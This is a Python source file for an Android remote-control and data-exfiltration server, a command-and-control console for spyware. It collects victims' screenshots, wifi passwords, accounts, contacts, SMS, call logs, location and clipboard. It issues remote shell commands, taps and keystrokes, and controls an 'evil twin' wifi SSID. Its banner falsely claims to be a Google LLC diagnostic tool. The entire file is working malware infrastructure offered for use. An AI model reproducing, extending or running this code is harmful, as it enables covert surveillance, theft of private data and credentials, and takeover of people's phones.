#!/usr/bin/env python3
"""RCS Server - Controllo remoto + exfiltration"""
import asyncio, websockets, json, base64, os, datetime, sys
SCREEN_DIR = os.path.join(os.path.dirname(__file__),'..','capture')
os.makedirs(SCREEN_DIR,exist_ok=True)
devices = {}

async def ws_handler(ws):
    did = None
    try:
        m = json.loads(await asyncio.wait_for(ws.recv(),10))
        if m.get('type')=='register':
            did = m.get('device_id','?')
            devices[did] = {'ws':ws,'ip':ws.remote_address[0],'model':m.get('model','?'),'android':m.get('android','?'),'started':datetime.datetime.now()}
            print(f"\n[✅ DEVICE CONNESSO] {m.get('model','?')} ({did}) IP:{ws.remote_address[0]}")
            while True:
                m = json.loads(await asyncio.wait_for(ws.recv(),60))
                t = m.get('type')
                if t=='screen':
                    fn = os.path.join(SCREEN_DIR,f'{did}_live.jpg')
                    with open(fn,'wb') as f: f.write(base64.b64decode(m['data']))
                    print(f"\r[📸 Screen] {len(m['data'])/1.33:.0f} KB",end='',flush=True)
                elif t=='exfiltration_report':
                    print(f"\n\n[📁 EXFIL REPORT DA {did}]")
                    r = json.loads(m.get('data','{}'))
                    for k in ['device_info','wifi_passwords','accounts','contacts','sms_inbox','call_log','location','installed_apps','notifications','clipboard']:
                        v = r.get(k,{})
                        if isinstance(v,list): print(f"    {k}: {len(v)} elementi")
                        elif isinstance(v,dict): print(f"    {k}: {len(v)} chiavi" if k!='device_info' else f"    {k}: {v.get('model','')} - {v.get('owner_email','')}")
                    rf = os.path.join(SCREEN_DIR,f'{did}_report_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
                    with open(rf,'w') as f: json.dump(r,f,indent=2,default=str)
                    print(f"    Report salvato: {rf}\n")
                elif t=='shell_output':
                    print(f"\n[💻 OUTPUT {did}]\n{m.get('output','')}\n")
    except: pass
    finally:
        if did and did in devices: del devices[did]

async def console():
    target = None
    print("\n"+"="*60)
    print("  RCS - Console di Controllo Remoto v3.0")
    print("  Google LLC - Strumento di diagnostica rete")
    print("="*60)
    print("  COMANDI:")
    print("  list              - Elenca device connessi")
    print("  use <id>          - Seleziona target")
    print("  info              - Info del device selezionato")
    print("  exfil             - Avvia estrazione dati completa")
    print("  screenshot        - Cattura schermo")
    print("  tap <x> <y>       - Tocco schermo")
    print("  text <stringa>    - Scrive testo")
    print("  key <tasto>       - home|back|menu|power|volup|voldown|enter")
    print("  shell <comando>   - Esegui comando shell sul device remoto")
    print("  ssid <nome>       - Cambia SSID evil twin sul device remoto")
    print("  exit              - Esci")
    print("="*60)
    
    while True:
        try:
            cmd = await asyncio.get_event_loop().run_in_executor(None,input,"\nrcs> ")
            parts = cmd.strip().split(maxsplit=1)
            a = parts[0].lower() if parts else ''
            p = parts[1] if len(parts)>1 else ''
            
            if a=='help':
                print("list, use <id>, info, exfil, screenshot, tap x y,")
                print("text <s>, key <home|back|enter>, shell <cmd>, ssid <nome>, exit")
            
            elif a=='list':
                if not devices: print("[!] Nessun device connesso")
                for d_id,d in devices.items():
                    e=datetime.datetime.now()-d['started']
                    print(f"  {d_id} | {d['model']} | {d['ip']} | da {e.seconds//60}m {e.seconds%60}s")
            
            elif a=='use':
                if p in devices: target=p; d=devices[target]; print(f"[+] Target: {d['model']} ({d['ip']})")
                else: print(f"[-] Device '{p}' non trovato. Usa 'list'")
            
            elif a in ('info','exfil','screenshot','tap','text','key','shell','ssid'):
                if not target or target not in devices:
                    print("[-] Seleziona un device con 'use <id>' prima")
                    continue
                if a=='info':
                    d=devices[target]
                    print(f"  Modello: {d['model']}\n  Android: {d['android']}\n  IP: {d['ip']}\n  Connesso da: {d['started']}")
                else:
                    await devices[target]['ws'].send(json.dumps({'type':'command','action':a,'params':p}))
                    print(f"[+] Comando '{a}' inviato a {target}")
            
            elif a=='exit':
                print("[!] Uscita...")
                return
            else:
                if a: print(f"[-] Comando sconosciuto: {a}. Digita 'help'")
        except (KeyboardInterrupt,EOFError):
            print("\n[!] Uscita...")
            return
        except Exception as e:
            print(f"[-] Errore: {e}")

async def main():
    port = int(sys.argv[1]) if len(sys.argv)>1 else 8765
    print(f"[*] RCS Server su 0.0.0.0:{port}")
    async with websockets.serve(ws_handler,"0.0.0.0",port): await console()

if __name__=='__main__': asyncio.run(main())
